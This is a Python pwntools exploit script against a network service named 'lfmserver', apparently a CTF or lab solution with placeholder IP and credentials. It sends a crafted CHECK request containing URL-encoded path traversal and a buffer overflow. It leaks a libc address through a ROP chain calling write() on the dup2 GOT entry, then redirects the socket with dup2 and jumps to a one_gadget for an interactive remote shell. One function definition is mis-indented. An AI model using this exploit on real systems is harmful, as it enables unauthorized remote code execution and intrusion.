from pwn import *

#context.log_level = 'debug'
IP = 'LALALAL'
PORT = 8888
FD = 6

bin = ELF('./lfmserver')
libc = ELF('libc.so.6')
TIME = 0.1

def generate():
  return remote(IP, PORT)
  
hash = "26ab0db90d72e28ad0ba1e22ee510510"

user = "LALALA"
password = "LALALAL"

def encode(string):
  return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)

def wait():
  p.recvrepeat(0.1)
  def genrequest(payload):
  request = "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/proc/sys/kernel/randomize_va_space%x00%61%61%61"
  request += "%61%61%61%61%61%62%61%61%61%61%61%61%61%63%61%61%61%61%61%61%61%64%61%61%61%61%61%61%61%65%61%61%61%61%61%61%"
  request += "61%66%61%61%61%61%61%61%61%67%61%61%61%61%61%61%61%68%61%61%61%61%61%61%61%69%61%61%61%61%61%61%61%6a%61%61%61"
  request += "%61%61%61%61%6b%61%61%61%61%61%61%61%6c%61%61%61%61%61%61%61%6d%61%61%61%61%61%61%61%6e%6e{}".format(encode(payload))
  request = "CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n".format(request, user, password, hash)
  return request

p = generate()
poprdi = 0x0000000000405c4b #: pop rdi; ret;
poprsi = 0x0000000000405c49 #: pop rsi; pop r15; ret;
ropnop = 0x000000000040251f #: nop; ret;

rop = p64(poprdi) + p64(FD) + p64(poprsi) + p64(bin.got['dup2']) + p64(0) + p64(ropnop) + p64(bin.symbols['write'])
p.sendline(genrequest(rop))

leak = p.recvall().split('\n')[4][1:7]
leak = u64(leak.ljust(8,'\x00'))
libc.address = leak - libc.symbols['dup2']
log.info("Libc base: " + hex(libc.address))

a = raw_input("continue?")

p = generate()

payload = p64(poprdi)
payload += p64(FD)
payload += p64(poprsi)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(bin.symbols['dup2'])

payload += p64(poprdi)
payload += p64(FD)
payload += p64(poprsi)
payload += p64(0x1)
payload += p64(0x0)
payload += p64(bin.symbols['dup2'])

payload += p64(poprdi)
payload += p64(FD)
payload += p64(poprsi)
payload += p64(0x2)
payload += p64(0x0)
payload += p64(bin.symbols['dup2'])

rop = payload + p64(poprdi) + p64(1) + p64(poprsi) + p64(bin.got['dup2']) + p64(0) + p64(ropnop) + p64(bin.symbols['write'])+p64(ropnop) + p64(libc.address + 0x501e3 )

p.sendline(genrequest(rop))
p.interactive()
